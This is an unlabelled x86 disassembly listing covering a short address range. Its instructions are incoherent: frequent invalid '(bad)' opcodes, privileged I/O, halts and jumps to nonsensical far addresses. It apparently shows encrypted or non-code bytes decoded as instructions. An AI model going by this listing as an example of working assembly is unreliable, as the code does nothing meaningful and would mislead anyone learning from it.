  4094c9:	not    DWORD PTR [edi]
  4094cb:	jmp    0xdb2303fb
  4094d0:	clc    
  4094d1:	dec    ebx
  4094d2:	cs hlt 
  4094d4:	mov    eax,0xf97b0ced
  4094d9:	cld    
  4094da:	mov    edi,0xf72779ef
  4094df:	inc    ecx
  4094e0:	es dec ebp
  4094e2:	sbb    dh,BYTE PTR [edx+0x5b]
  4094e5:	pop    ebx
  4094e6:	rcl    DWORD PTR [eax+0x60f462be],1
  4094ec:	into   
  4094ed:	pop    ebx
  4094ee:	cli    
  4094ef:	mov    bl,0xb4
  4094f1:	and    BYTE PTR [ebx+edi*2+0x29],ch
  4094f5:	(bad)  
  4094f6:	mov    dl,0x87
  4094f8:	fs pop es
  4094fa:	fwait
  4094fb:	pushf  
  4094fc:	jo     0x4094d8
  4094fe:	inc    esp
  4094ff:	dec    esp
  409500:	xchg   ebx,eax
  409501:	cs test al,0x1b
  409504:	test   BYTE PTR [edi],dl
  409506:	icebp  
  409507:	je     0x4094bf
  409509:	popa   
  40950a:	popa   
  40950b:	push   cs
  40950c:	xlat   BYTE PTR ds:[ebx]
  40950d:	lock imul ecx,DWORD PTR [edx-0x6f5ef2a5],0xffffffb3
  409515:	adc    BYTE PTR [ebx],0x47
  409518:	cdq    
  409519:	aas    
  40951a:	sahf   
  40951b:	dec    esp
  40951c:	popf   
  40951d:	jnp    0x4094df
  40951f:	dec    ch
  409521:	inc    edi
  409522:	dec    ebx
  409523:	repnz xor al,0x9
  409526:	out    dx,al
  409527:	mov    BYTE PTR [eax-0x59f09e50],dh
  40952d:	sub    al,0x11
  40952f:	in     al,0xb
  409531:	ds iret 
  409533:	mov    ebx,0xdc5d6c7c
  409538:	pop    ebx
  409539:	aam    0x75
  40953b:	scas   eax,DWORD PTR es:[edi]
  40953c:	popf   
  40953d:	add    al,0x8d
  40953f:	adc    DWORD PTR [edi-0x6b],esp
  409542:	mov    ?,esp
  409544:	icebp  
  409545:	fsubrp st(2),st
  409547:	and    eax,0x8899cc3b
  40954c:	clc    
  40954d:	gs fs xchg ecx,eax
  409550:	sub    DWORD PTR [esi-0x1e6ce945],esp
  409556:	hlt    
  409557:	dec    ebx
  409558:	fwait
  409559:	mov    eax,ds:0x4dc5b7d8
  40955e:	fimul  DWORD PTR [ebx-0x3ce29684]
  409564:	mov    ebp,0xfe33c84e
  409569:	mov    dl,0xc9
  40956b:	or     DWORD PTR [edi+0x45],0xffffff85
  40956f:	sti    
  409570:	les    esi,FWORD PTR [eax-0x4442b78e]
  409576:	enter  0x501f,0x79
  40957a:	out    dx,eax
  40957b:	xchg   edi,eax
  40957c:	nop
  40957d:	xchg   DWORD PTR [eax-0x185ddd6a],esp
  409583:	sub    esp,esi
  409585:	test   eax,0x62aadc04
  40958a:	xor    al,0xd4
  40958c:	mov    cl,0xa8
  40958e:	leave  
  40958f:	popf   
  409590:	sub    DWORD PTR [esi],ebp
  409592:	rcr    DWORD PTR [edx+0x6e08d297],1
  409598:	mov    ah,0x75
  40959a:	sub    DWORD PTR [ebx-0x35a5e3a5],0x2bcf0c1f
  4095a4:	mov    BYTE PTR [esi],0x1b
  4095a7:	das    
  4095a8:	push   esp
  4095a9:	sbb    DWORD PTR [ebp-0x5ea29c07],ebx
  4095af:	shr    BYTE PTR [ecx+0x9],1
  4095b2:	push   0xffffff8b
  4095b4:	(bad)  
  4095b5:	rol    bl,1
  4095b7:	fdivr  QWORD PTR [ebx-0x56]
  4095ba:	test   DWORD PTR [eax-0x2171a9cf],ecx
  4095c0:	xchg   ecx,eax
  4095c1:	mov    ds:0x57331d83,al
  4095c6:	js     0x40958e
  4095c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095c9:	popf   
  4095ca:	cmp    al,0x74
  4095cc:	sar    al,0xd7
  4095cf:	jae    0x4095ab
  4095d1:	mov    ch,0xfd
  4095d3:	cli    
  4095d4:	xchg   ecx,eax
  4095d5:	pop    ebp
  4095d6:	sbb    al,BYTE PTR [ebx]
  4095d8:	ds out 0xcf,eax
  4095db:	inc    ebx
  4095dc:	ins    BYTE PTR es:[edi],dx
  4095dd:	and    edx,DWORD PTR es:[di+0x5509]
  4095e3:	fldcw  WORD PTR fs:[edi-0x3ce033ff]
  4095ea:	and    al,0x51
  4095ec:	stos   BYTE PTR es:[edi],al
  4095ed:	shr    BYTE PTR [esi],0x32
  4095f0:	in     al,0xaa
  4095f2:	retf   
  4095f3:	repnz and ch,cl
  4095f6:	outs   dx,DWORD PTR ds:[esi]
  4095f7:	xor    ecx,DWORD PTR [ecx]
  4095f9:	push   esp
  4095fa:	pushf  
  4095fb:	jbe    0x40960c
  4095fd:	call   0x10bd:0xc62ea56f
  409604:	xor    DWORD PTR [edi],0x36
  409607:	(bad)  
  40960a:	in     al,dx
  40960b:	mov    dl,0x6c
  40960d:	push   ebx
  40960e:	pop    esp
  40960f:	push   edx
  409610:	jp     0x4095f3
  409612:	sbb    al,0x6a
  409614:	sub    al,0x85
  409616:	gs cmp al,0x98
  409619:	leave  
  40961a:	lahf   
  40961b:	rdseed esi
  40961e:	jge    0x4095fa
  409620:	ficom  DWORD PTR [ebx-0x3616f868]
  409626:	and    al,0x2c
  409628:	push   es
  409629:	pop    esi
  40962a:	pop    ebx
  40962b:	stos   BYTE PTR es:[edi],al
  40962c:	jecxz  0x409644
  40962e:	mov    eax,DWORD PTR [ebx+0x39]
  409631:	mov    bl,0x40
  409633:	push   ebp
  409634:	ja     0x4095fa
  409636:	xchg   esp,eax
  409637:	fisttp QWORD PTR [esp+ebp*4-0x651d43cf]
  40963e:	ret    0xa2ad
  409641:	inc    ebx
  409642:	ja     0x409625
  409644:	xchg   ecx,eax
  409645:	ins    BYTE PTR es:[edi],dx
  409646:	call   0x33c4:0xe6289d93
  40964d:	ja     0x409614
  40964f:	pop    ebx
  409650:	cs popa 
  409652:	mov    ebp,0xaa8abb2a
  409657:	xor    BYTE PTR [ecx],0xfe
  40965a:	mov    eax,0x2e4daead
  40965f:	mov    esp,0x25beffc1
  409664:	idiv   BYTE PTR [ecx]
  409666:	fs xor bl,dl
  409669:	ins    BYTE PTR es:[edi],dx
  40966a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40966b:	cmp    dl,dh
  40966d:	sar    BYTE PTR [ecx-0x28],0x2a
  409671:	sbb    BYTE PTR [edx+0x66407eb3],dl
  409677:	add    al,0xa7
  409679:	jecxz  0x409678
  40967b:	les    eax,FWORD PTR [edx+0x4]
  40967e:	pop    es
  40967f:	push   esp
  409680:	outs   dx,BYTE PTR ds:[esi]
  409681:	test   eax,0x3e31d5d8
  409686:	mov    dl,0x3c
  409688:	sar    BYTE PTR [eax],0xf4
  40968b:	outs   dx,BYTE PTR ds:[esi]
  40968c:	mov    al,0x9
  40968e:	cld    
  40968f:	stos   DWORD PTR es:[edi],eax
  409690:	fld    QWORD PTR [eax]
  409692:	or     DWORD PTR [ecx],esp
  409694:	enter  0x431,0x5a
  409698:	pop    ds
  409699:	fimul  DWORD PTR [edx-0x348c7ae4]
  40969f:	shr    BYTE PTR [edi+0x2d],0xdb
  4096a3:	sbb    al,0xd7
  4096a5:	call   0x1c9d9e6f
  4096aa:	aam    0xd1
  4096ac:	dec    eax
  4096ad:	pop    edx
  4096ae:	sti    
  4096af:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096b1:	mov    al,ds:0xe9753ca8
  4096b6:	xchg   edx,eax
  4096b7:	out    dx,eax
  4096b8:	jl     0x409737
  4096ba:	ret    0xd5a4
  4096bd:	mov    eax,ds:0xd71fc4c
  4096c2:	sar    DWORD PTR [eax],cl
  4096c4:	(bad)  
  4096c5:	push   edi
  4096c6:	ins    BYTE PTR es:[edi],dx
  4096c7:	add    eax,0x9baac25
  4096cc:	xor    BYTE PTR [edi],dl
  4096ce:	dec    edi
  4096cf:	mov    WORD PTR [edx],ss
  4096d1:	rol    DWORD PTR [edi+0x3d2cf70f],0x4
  4096d8:	adc    dh,dh
  4096da:	xor    BYTE PTR [eax-0xf],al
  4096dd:	sub    ebp,esi
  4096df:	mov    ebp,0xa8063526
  4096e4:	pop    edx
  4096e5:	sbb    BYTE PTR [ebp+0x2da09223],ch
  4096eb:	push   ds
  4096ec:	add    al,BYTE PTR [edi-0x36]
  4096ef:	sbb    BYTE PTR es:[esi+0x2a],al
  4096f3:	lock (bad) 
  4096f5:	dec    ecx
  4096f6:	sub    DWORD PTR [edi-0x3242c2c4],ebx
  4096fc:	push   0x93f9eb35
  409701:	inc    ebp
  409702:	xchg   edi,eax
  409703:	dec    eax
  409704:	(bad)  [ebx+esi*8-0x5a59000e]
  40970b:	mov    esp,0xddd0f34d
  409710:	les    eax,FWORD PTR [eax+0x757d4514]
  409716:	sti    
  409717:	sub    DWORD PTR [ebp+0x22],ebx
  40971a:	sbb    eax,0x682e812c
  40971f:	or     bl,bl
  409721:	mov    edi,0xb3a0218e
  409726:	pop    eax
  409727:	jl     0x409788
  409729:	mov    esi,0x27f56f83
  40972e:	mov    ss,edi
  409730:	mov    dh,0x59
  409732:	jno    0x4096f6
  409734:	jnp    0x40974b
  409736:	and    edx,edx
  409738:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409739:	stos   DWORD PTR es:[edi],eax
  40973a:	ds out dx,al
  40973c:	pop    esp
  40973d:	dec    ebx
  40973e:	push   esi
  40973f:	iret   
  409740:	bound  ebp,QWORD PTR fs:[esp+esi*1+0x5f]
  409745:	pop    es
  409746:	test   al,0xf4
  409748:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409749:	pop    ds
  40974a:	scas   al,BYTE PTR es:[edi]
  40974b:	nop
  40974c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40974d:	jecxz  0x409752
  40974f:	adc    esi,DWORD PTR [edx-0x6138453e]
  409755:	dec    ecx
  409756:	dec    eax
  409757:	sub    eax,ecx
  409759:	int3   
  40975a:	dec    edi
  40975b:	inc    esi
  40975c:	retf   0x389e
  40975f:	ror    ch,1
  409761:	inc    esi
  409762:	adc    DWORD PTR [edi+0x32],ebx
  409765:	xchg   BYTE PTR [ebp+eiz*2-0x4],ah
  409769:	pop    edi
  40976a:	push   ebp
  40976b:	mov    edx,DWORD PTR [esi-0x1b]
  40976e:	xor    edx,DWORD PTR es:[eax]
  409771:	mov    esp,0x85cc6382
  409776:	push   esi
  409777:	push   ds
  409778:	je     0x40979a
  40977a:	ds ins DWORD PTR es:[edi],dx
  40977c:	jne    0x4097ab
  40977e:	push   eax
  40977f:	add    BYTE PTR [eax],dh
  409781:	add    eax,DWORD PTR [edx+0x25a76ba0]
  409787:	dec    edx
  409788:	push   eax
  409789:	mov    al,ds:0xd5c96e7b
  40978e:	repz (bad) 
  409790:	and    al,0x96
  409792:	cmp    ecx,esp
  409794:	mov    ah,0x41
  409796:	push   ecx
  409797:	je     0x409768
  409799:	xor    DWORD PTR [edi],esi
  40979b:	ins    BYTE PTR es:[edi],dx
  40979c:	dec    ebp
  40979d:	cdq    
  40979e:	inc    esp
  40979f:	or     al,0xc4
  4097a2:	sub    al,0xa7
  4097a4:	aad    0x40
  4097a6:	lahf   
  4097a7:	leave  
  4097a8:	adc    DWORD PTR [ebp+0x24],esp
  4097ab:	pop    esp
  4097ac:	xchg   ebx,eax
  4097ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097ae:	and    eax,0x8ce5ab67
  4097b3:	sar    esp,cl
  4097b5:	xor    BYTE PTR [edx-0xa05a974],al
  4097bb:	scas   al,BYTE PTR es:[edi]
  4097bc:	ja     0xf7299f3d
  4097c2:	inc    DWORD PTR [bp+si]
  4097c5:	sbb    BYTE PTR [edx+0x2],ch
  4097c8:	dec    edi
  4097c9:	cmp    DWORD PTR cs:[edi+0x2f],ebx
  4097cd:	jno    0x4097d3
  4097cf:	out    dx,eax
  4097d0:	dec    DWORD PTR [edi]
  4097d2:	in     eax,dx
  4097d3:	dec    edi
  4097d4:	pop    ecx
  4097d5:	jp     0x4097df
  4097d7:	adc    edi,DWORD PTR [ebx]
  4097d9:	(bad)  
  4097db:	push   eax
  4097dc:	dec    ebx
  4097dd:	int    0xab
  4097df:	sbb    dl,BYTE PTR [edx+0x145443a9]
  4097e5:	sub    al,0xeb
  4097e7:	and    eax,0xcc3f44ce
  4097ec:	push   eax
  4097ed:	mov    WORD PTR [ebp+0x12],ds
  4097f0:	pop    edi
  4097f1:	xor    al,0xea
  4097f3:	xchg   esi,eax
  4097f4:	test   bh,0x85
  4097f7:	mov    BYTE PTR [ebx],cl
  4097f9:	outs   dx,BYTE PTR ds:[esi]
  4097fa:	fcomp  DWORD PTR [eax]
  4097fc:	enter  0x21ff,0x7e
  409800:	stos   BYTE PTR es:[edi],al
  409801:	out    dx,al
  409802:	xor    eax,ebx
  409804:	mov    bl,0xb9
  409806:	jg     0x40981d
  409808:	lahf   
  409809:	out    dx,al
  40980a:	std    
  40980b:	mov    esp,edx
  40980d:	std    
  40980e:	sbb    al,0x8c
  409810:	and    edi,DWORD PTR [edi+0x4a]
  409813:	xor    eax,0xabe68214
  409818:	neg    esp
  40981a:	jmp    0x4097e6
  40981c:	xchg   ecx,eax
  40981d:	(bad)  
  40981e:	jmp    0x4097ff
  409820:	xor    al,0xfb
  409822:	loop   0x4097d5
  409824:	jo     0x40987d
  409826:	das    
  409827:	jnp    0x4097cf
  409829:	xchg   edx,eax
  40982a:	fsin   
  40982c:	mov    WORD PTR [ebp-0x5d17a769],fs
  409832:	shl    eax,cl
  409834:	es cmc 
  409836:	jo     0x409878
  409838:	lock sbb DWORD PTR [esi+0x4ebc1793],eax
  40983f:	pop    ecx
  409840:	jp     0x40981c
  409842:	retf   
  409843:	cmp    al,0xbb
  409845:	dec    edi
  409846:	ret    
  409847:	jge    0x409863
  409849:	sti    
  40984a:	and    eax,0x6209adba
  40984f:	test   al,0x86
  409851:	jns    0x40985f
  409853:	jns    0x409848
  409855:	rcr    BYTE PTR [eax+0x29e8ce3c],cl
  40985b:	cs scas eax,DWORD PTR es:[edi]
  40985d:	cmc    
  40985e:	sbb    eax,0x6d2dfbd0
  409863:	inc    edi
  409864:	pushf  
  409865:	mov    al,ds:0x3c80b323
  40986a:	ror    DWORD PTR [ebp+ebp*1+0x6f],1
  40986e:	xchg   esp,eax
  40986f:	mov    bl,0x7d
  409871:	sub    edx,esi
  409873:	add    al,0x8c
  409875:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409876:	nop
  409877:	pop    esp
  409878:	aam    0x97
  40987a:	adc    al,0x27
  40987c:	in     al,dx
  40987d:	add    DWORD PTR [ebx+0x73],edx
  409880:	inc    esp
  409881:	popa   
  409882:	push   ss
  409883:	mov    eax,0x69b5c0ea
  409888:	xlat   BYTE PTR ds:[ebx]
  409889:	jp     0x4098c6
  40988b:	pusha  
  40988c:	inc    edx
  40988d:	mov    BYTE PTR [eax],0xf3
  409890:	adc    edx,DWORD PTR [ebp+0x2b7bee43]
  409896:	int    0x87
  409898:	stos   DWORD PTR es:[edi],eax
  409899:	jbe    0x4098cc
  40989b:	retf   
  40989c:	bound  ecx,QWORD PTR [ecx+0x2b]
  40989f:	test   DWORD PTR [edx-0x4622242e],0x35b160c0
  4098a9:	out    dx,al
  4098aa:	xchg   edi,eax
  4098ab:	mov    esi,0xe107f941
  4098b0:	clc    
  4098b1:	lea    edx,[edx]
  4098b3:	outs   dx,BYTE PTR ds:[esi]
  4098b4:	or     esi,DWORD PTR [di]
  4098b7:	ret    0x9590
  4098ba:	inc    edi
  4098bb:	and    BYTE PTR [edx-0x67],cl
  4098be:	jmp    0x931c:0xcd24ff48
  4098c5:	pop    ebp
  4098c6:	shl    cl,cl
  4098c8:	push   0xffffffb1
  4098ca:	sub    al,bh
  4098cc:	mov    edi,DWORD PTR cs:[eax-0x23637b0a]
  4098d3:	das    
  4098d4:	inc    edx
  4098d5:	adc    al,0xc7
  4098d7:	push   edx
  4098d8:	and    ebp,DWORD PTR [edi+eax*8-0x64755c2f]
  4098df:	rol    ch,cl
  4098e1:	imul   BYTE PTR [edi+0x4c]
  4098e4:	mov    dh,BYTE PTR [ebp+0x36811467]
  4098ea:	jno    0x4098b4
  4098ec:	aam    0x9e
  4098ee:	fs push ebp
  4098f0:	aaa    
  4098f1:	push   es
  4098f2:	cmp    ah,BYTE PTR [edx]
  4098f4:	xor    al,0xb0
  4098f6:	mov    ebx,0x2dccbefa
  4098fb:	(bad)
  4098ff:	jmp    0xbd78f511
  409904:	xchg   ebp,eax
  409905:	jle    0x409934
  409907:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409908:	and    BYTE PTR [esp+ebp*1],ch
  40990b:	push   edi
  40990c:	pop    ecx
  40990d:	fwait
  40990e:	int    0xb8
  409910:	fimul  DWORD PTR [ebp+0x6c4595a1]
  409916:	rol    bl,0x79
  409919:	out    dx,eax
  40991a:	dec    esp
  40991b:	push   ecx
  40991c:	dec    esp
  40991d:	in     al,dx
  40991e:	idiv   BYTE PTR [ecx-0x26]
  409921:	dec    edx
  409922:	(bad)  
  409923:	or     eax,0x720b27a2
  409928:	jbe    0x409951
  40992a:	icebp  
  40992b:	sub    DWORD PTR [ebp+0xbb8ae9a],ecx
  409931:	adc    al,0x7a
  409933:	mov    ds:0x28fd538c,eax
  409938:	data16 aas 
  40993a:	aas    
  40993b:	mov    eax,ds:0x26a1599b
  409940:	inc    eax
  409941:	int3   
  409942:	push   ecx
  409943:	fild   WORD PTR [ebx]
  409945:	xlat   BYTE PTR ds:[ebx]
  409946:	frndint 
  409948:	jmp    0x4099ad
  40994a:	dec    ebx
  40994b:	je     0x409971
  40994d:	add    al,BYTE PTR [esi+ecx*4]
  409950:	dec    edx
  409951:	fimul  DWORD PTR [ebx]
  409953:	imul   ecx,DWORD PTR [edx],0xeb8b494e
  409959:	add    ch,dh
  40995b:	xchg   esp,eax
  40995c:	jl     0x409907
  40995e:	into   
  40995f:	or     bh,al
  409961:	rcr    BYTE PTR [ecx+0xdf41a67],cl
  409967:	sbb    eax,0x9586283a
  40996c:	hlt    
  40996d:	in     eax,dx
  40996e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40996f:	sbb    al,0x2
  409971:	push   ebx
  409972:	stc    
  409973:	mov    al,ds:0xe04ae60f
  409978:	gs std 
  40997a:	jo     0x4099e1
  40997c:	mov    al,0x82
  40997e:	test   eax,0x2117f70e
  409983:	(bad)  
  409984:	sti    
  409985:	adc    al,BYTE PTR [ebp-0x7c260722]
  40998b:	jns    0x40993b
  40998d:	pop    eax
  40998e:	pusha  
  40998f:	inc    esp
  409990:	shl    DWORD PTR [ebx],1
  409992:	imul   edi,DWORD PTR [esp+esi*8],0xd5f68bb3
  409999:	jae    0x4099c9
  40999b:	push   ebp
  40999c:	jnp    0x409990
  40999e:	mov    WORD PTR [ebp+0x612e0c71],?
  4099a4:	test   eax,0xbe914c9b
  4099a9:	(bad)  
  4099aa:	fcmovnu st,st(3)
  4099ac:	mov    esi,0x6ef116ce
  4099b1:	and    al,0x1d
  4099b3:	dec    edx
  4099b4:	jo     0x40997c
  4099b6:	lea    eax,[ecx]
  4099b8:	imul   edi,DWORD PTR [esi+eax*2],0xffffffa4
  4099bc:	out    dx,al
  4099bd:	sbb    ah,bh
  4099bf:	pop    esi
  4099c0:	jmp    DWORD PTR [ecx-0x72]
  4099c3:	shr    bh,1
  4099c5:	jecxz  0x4099b9
  4099c7:	outs   dx,DWORD PTR ds:[esi]
  4099c8:	aam    0x70
  4099ca:	adc    ah,BYTE PTR [ebx-0x4f]
  4099cd:	pop    esp
  4099ce:	mov    dl,BYTE PTR [ebx-0x61]
  4099d1:	bound  esp,QWORD PTR [ebx+0x6edfd39f]
  4099d7:	fwait
  4099d8:	test   al,0xc2
  4099da:	xor    eax,0xa222927c
  4099df:	inc    eax
  4099e0:	xchg   edx,eax
  4099e1:	jg     0x409a22
  4099e3:	inc    esi
  4099e4:	bnd jmp 0x371bc4dd
  4099ea:	push   cs
  4099eb:	jne    0x409a4c
  4099ed:	cwde   
  4099ee:	xor    eax,0x45e93ad1
  4099f3:	aaa    
  4099f4:	push   edx
  4099f5:	inc    eax
  4099f6:	sub    ebp,DWORD PTR [ecx]
  4099f8:	and    al,0x2a
  4099fa:	mov    ah,0x9f
  4099fc:	mov    esp,0xccada4e5
  409a01:	jmp    0x42a:0x48a97c7c
  409a08:	cwde   
  409a09:	stos   DWORD PTR es:[edi],eax
  409a0a:	dec    esp
  409a0b:	int    0x23
  409a0d:	dec    esp
  409a0e:	icebp  
  409a0f:	loope  0x4099f8
  409a11:	adc    DWORD PTR [edx-0x26a25aa],edi
  409a17:	dec    ecx
  409a18:	shr    DWORD PTR [esi],0x4f
  409a1b:	fimul  DWORD PTR [edx-0x33]
  409a1e:	sub    eax,0x3c90f4c9
  409a23:	cmp    DWORD PTR [ebp+0xc1185a],ebx
  409a29:	outs   dx,DWORD PTR ds:[esi]
  409a2a:	jb     0x409a84
  409a2c:	inc    ebp
  409a2d:	hlt    
  409a2e:	loopne 0x409a8a
  409a30:	in     eax,dx
  409a31:	pop    ebx
  409a32:	enter  0xc0dc,0xca
  409a36:	mov    ch,0xdf
  409a38:	dec    eax
  409a39:	(bad)  
  409a3a:	aam    0x51
  409a3c:	dec    esp
  409a3d:	test   DWORD PTR [esi-0x4d42d2a4],ebx
  409a43:	inc    ecx
  409a44:	fadd   QWORD PTR [ebp+0x2a]
  409a47:	das    
  409a48:	jns    0x409a54
  409a4a:	aam    0xb6
  409a4c:	sti    
  409a4d:	std    
  409a4e:	jmp    0xc591:0x33597cbf
  409a55:	les    ebx,FWORD PTR [eax+0x77]
  409a58:	sbb    eax,0x1e4e628e
  409a5d:	xor    eax,0xb3497200
  409a62:	je     0x409ad5
  409a64:	sub    DWORD PTR [edx+0x79],ebx
  409a67:	sar    DWORD PTR [ecx-0x60],cl
  409a6a:	xchg   ebx,eax
  409a6b:	loope  0x409a3a
  409a6d:	inc    ebp
  409a6e:	retf   0x5a3e
  409a71:	test   al,0x5f
  409a73:	retf   0x9abd
  409a76:	int3   
  409a77:	dec    edi
  409a78:	ins    DWORD PTR es:[edi],dx
  409a79:	mov    ds:0x57d863e3,al
  409a7e:	pop    edx
  409a7f:	dec    esp
  409a80:	mov    ecx,0x776d8277
  409a85:	lock mov eax,gs
  409a88:	mov    ecx,edi
  409a8a:	leave  
  409a8b:	das    
  409a8c:	rol    DWORD PTR [edi+0x27cb534b],cl
  409a92:	dec    ecx
  409a93:	int    0x5d
  409a95:	dec    DWORD PTR [edi-0x64cd6ff6]
  409a9b:	iret   
  409a9c:	and    eax,0x4c1f2a6d
  409aa1:	sbb    al,0x53
  409aa3:	bnd jmp 0x409a69
  409aa6:	inc    ebp
  409aa7:	(bad)  
  409aa9:	pop    ss
  409aaa:	sub    ebp,DWORD PTR [ebx-0x7e42938f]
  409ab0:	and    eax,DWORD PTR [edx+0x18]
  409ab3:	(bad)  
  409ab4:	in     eax,dx
  409ab5:	or     esi,DWORD PTR [esi]
  409ab7:	jne    0x409b0f
  409ab9:	sub    BYTE PTR [edi+0x4c],ah
  409abc:	add    ah,BYTE PTR ss:[edx+0x38]
  409ac0:	add    eax,0x7cf5ffe8
  409ac5:	pop    ss
  409ac6:	push   0x3e30ceea
  409acb:	mov    ds:0x529baacd,eax
  409ad0:	sbb    BYTE PTR [eax+0x1],ch
  409ad3:	sahf   
  409ad4:	cmp    al,0xf7
  409ad6:	pop    edx
  409ad7:	arpl   WORD PTR [ecx-0x37],cx
  409ada:	xor    eax,0x21712315
  409adf:	mov    cl,0xf8
  409ae1:	cmp    ax,0xed69
  409ae5:	fistp  QWORD PTR [edx-0x79]
  409ae8:	mov    ecx,0x27f467dd
  409aed:	(bad)  
  409aef:	imul   ebp,DWORD PTR [eax+0x3cee9f87],0xfde6f3fe
  409af9:	sub    BYTE PTR [esi+0x38],bh
  409afc:	lods   eax,DWORD PTR ds:[esi]
  409afd:	into   
  409afe:	lods   al,BYTE PTR ds:[esi]
  409aff:	mov    BYTE PTR [ecx],ch
  409b01:	adc    dh,0x6b
  409b04:	xor    eax,0x31f64d90
  409b09:	in     al,0x3a
  409b0b:	mov    bh,0x83
  409b0d:	sbb    eax,DWORD PTR ds:[ebx-0x45602583]
  409b14:	retf   0xa36d
  409b17:	add    eax,0x8be798b6
  409b1c:	(bad)  
  409b1d:	mov    bl,BYTE PTR [ebp+0x1600faf]
  409b23:	or     DWORD PTR [ebx+0x18755dad],esi
  409b29:	or     esi,ecx
  409b2b:	sbb    BYTE PTR [edi-0x49cd0bbb],ch
  409b31:	addr16 mov edi,0xb77d9be1
  409b37:	cmp    bl,BYTE PTR [ebx]
  409b39:	or     bl,BYTE PTR [esi]
  409b3b:	mov    edx,0xa56c5ef0
  409b40:	enter  0x184a,0xd4
  409b44:	(bad)  
  409b45:	test   eax,0xd6b53b94
  409b4a:	fst    DWORD PTR [ebp+0x144144f6]
  409b50:	pushf  
  409b51:	mov    dh,0x9
  409b53:	ds lahf 
  409b55:	sub    ebx,DWORD PTR [edi]
  409b57:	add    al,0xcf
  409b59:	jnp    0x409aef
  409b5b:	es dec esi
  409b5d:	mov    dh,0xa8
  409b5f:	adc    bh,bl
  409b61:	enter  0x32a4,0x0
  409b65:	mov    al,0x60
  409b67:	fs es and al,0xae
  409b6b:	loope  0x409af1
  409b6d:	mov    ebp,0x64577fb2
  409b72:	mov    ch,0xfb
  409b74:	jg     0x409b92
  409b76:	fisubr WORD PTR [edx+esi*1]
  409b79:	mov    esp,DWORD PTR [ebp+0x629c53fe]
  409b7f:	or     eax,0x92f4cf94
  409b84:	(bad)  
  409b85:	ins    BYTE PTR es:[edi],dx
  409b86:	stos   BYTE PTR es:[edi],al
  409b87:	(bad)  
  409b88:	sub    al,0x32
  409b8a:	xlat   BYTE PTR ds:[ebx]
  409b8b:	mov    ds:0xfa40d3f6,eax
  409b90:	aam    0x30
  409b92:	aas    
  409b93:	push   ds
  409b94:	pop    edi
  409b95:	cmp    eax,0x15cf02fb
  409b9a:	mov    dh,0x93
  409b9c:	fcom   QWORD PTR [ecx]
  409b9e:	mov    al,0x1a
  409ba0:	mov    bh,0x19
  409ba2:	lds    edx,FWORD PTR ds:0xce2aba40
  409ba8:	add    DWORD PTR [ebx],edi
  409baa:	cmp    eax,0xe0714672
  409baf:	es fstp TBYTE PTR es:[edx-0x1]
  409bb4:	lods   eax,DWORD PTR ds:[esi]
  409bb5:	sbb    esp,eax
  409bb7:	sbb    DWORD PTR [ebx-0x6c8a000f],0x507306be
  409bc1:	ds mov ebp,0x513dd402
  409bc7:	aad    0x68
  409bc9:	js     0x409c2c
  409bcb:	lahf   
  409bcc:	or     ah,BYTE PTR [ebx]
  409bce:	out    0x37,al
  409bd0:	cs test esp,edi
  409bd3:	jmp    0xa999182e
  409bd8:	cwd    
  409bda:	scas   al,BYTE PTR es:[edi]
  409bdb:	lds    ecx,FWORD PTR [edx-0x55ae01f9]
  409be1:	aam    0xc
  409be3:	or     DWORD PTR [ecx],esi
  409be5:	(bad)  
  409be6:	in     eax,0x51
  409be8:	xchg   BYTE PTR [edx+0x66],bl
  409beb:	arpl   WORD PTR [ebx+0x60d53333],ax
  409bf1:	jno    0x409c25
  409bf3:	xchg   ebp,eax
  409bf4:	and    al,0x5b
  409bf6:	and    DWORD PTR [eax],eax
  409bf8:	cmp    BYTE PTR ds:0x99cb4b64,cl
  409bfe:	inc    ecx
  409bff:	ins    DWORD PTR es:[edi],dx
  409c00:	mov    bh,0x1b
  409c02:	in     al,0xe8
  409c04:	lods   eax,DWORD PTR ds:[esi]
  409c05:	ins    DWORD PTR es:[edi],dx
  409c06:	adc    dl,BYTE PTR [edx+0x538aa4a9]
  409c0c:	out    0xe5,eax
  409c0e:	gs push cs
  409c10:	mov    al,ds:0xe647a09
  409c15:	adc    DWORD PTR [edi+0x54ca82d3],edi
  409c1b:	jbe    0x409baa
  409c1d:	sub    esi,DWORD PTR [ecx+eiz*4]
  409c20:	push   es
  409c21:	out    dx,eax
  409c22:	cld    
  409c23:	adc    eax,0x2725b43f
  409c28:	(bad)  
  409c29:	mov    bl,0x6c
  409c2b:	xchg   ecx,eax
  409c2c:	jae    0x409c22
  409c2e:	dec    eax
  409c2f:	inc    edi
  409c30:	jne    0x409be0
  409c32:	sti    
  409c33:	adc    al,bl
  409c35:	xor    cl,BYTE PTR [edi+0x569dc11d]
  409c3b:	dec    eax
  409c3c:	mov    ebx,DWORD PTR [edx-0x62f1b0c1]
  409c42:	push   esi
  409c43:	in     eax,dx
  409c44:	mul    esp
  409c46:	imul   ecx,DWORD PTR [ebx],0x33
  409c49:	je     0x409bcb
  409c4b:	(bad)  
  409c4c:	arpl   WORD PTR [eax],ax
  409c4e:	cmp    bh,dh
  409c50:	loop   0x409caa
  409c52:	inc    edi
  409c53:	pusha  
  409c54:	sub    cl,BYTE PTR [edi]
  409c56:	mov    ebp,0x41829106
  409c5b:	sbb    al,BYTE PTR [ebp+0x798bdf80]
  409c61:	fst    DWORD PTR [ebx-0x5eb6299c]
  409c67:	retf   
  409c68:	add    dl,BYTE PTR [edx+0x67866375]
  409c6e:	out    dx,eax
  409c6f:	imul   edi,DWORD PTR [ebp-0x288a91d3],0xffffff8f
  409c76:	aas    
  409c77:	mov    cl,0xb2
  409c79:	xchg   esp,eax
  409c7a:	pushf  
  409c7b:	push   ds
  409c7c:	sub    DWORD PTR [edx+0x6b],0x9b046edf
  409c83:	jne    0x409c83
  409c85:	das    
  409c86:	test   eax,0x9c582706
  409c8b:	mov    ds:0x75a47573,eax
  409c90:	push   ebp
  409c91:	and    ch,BYTE PTR [esi-0x3487366d]
